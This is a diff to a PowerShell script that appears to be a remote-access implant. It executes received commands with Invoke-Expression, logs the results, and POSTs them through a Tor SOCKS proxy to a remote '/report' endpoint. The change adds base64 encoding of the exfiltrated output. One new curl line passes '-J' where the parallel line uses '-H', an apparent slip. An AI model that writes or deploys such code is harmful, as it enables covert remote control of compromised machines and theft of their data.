@@ -47,16 +47,19 @@ function main {
         if ($cmd -and $cmd -ne "noop") {
             try {
                 # Capture output including errors
-                $output = Invoke-Expression "($cmd) | Out-String" 2>&1
+                $output = Invoke-Expression "$cmd | Out-String" 2>&1
                 $outText = "SUCCESS: $output"
                 $outText | Out-File -Append -FilePath $log
 
-                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -d "$outText" "$url/report"
+                $eOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($outText))
+                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -J "Content-Type: text/plain" -d $eOutput "$url/report"
             }
             catch {
                 $err = "ERROR: $($_.Exception.Message)"
                 $err | Out-File -Append -FilePath $log
-                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -d "$err" "$url/report"
+
+                $eErr = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($err))
+                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" -d $eErr "$url/report"
             }
         }
     }
